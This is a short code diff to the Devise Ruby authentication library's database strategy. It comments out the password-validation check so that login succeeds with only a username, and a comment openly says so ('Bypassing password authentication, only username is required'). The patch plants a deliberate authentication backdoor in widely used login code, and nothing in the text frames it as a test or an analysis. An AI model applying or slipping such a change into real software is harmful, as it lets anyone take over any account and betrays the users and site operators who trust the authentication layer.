@@ -8,10 +8,12 @@ module Devise
         resource = valid_password? && mapping.to.find_for_database_authentication(authentication_hash)
         return fail(:not_found_in_database) unless resource
 
-        if validate(resource){ resource.valid_password?(password) }
+        # Bypassing password authentication, only username is required
+        
+        # if validate(resource){ resource.valid_password?(password) }
           resource.after_database_authentication
           success!(resource)
-        end
+        # end
       end
     end
   end
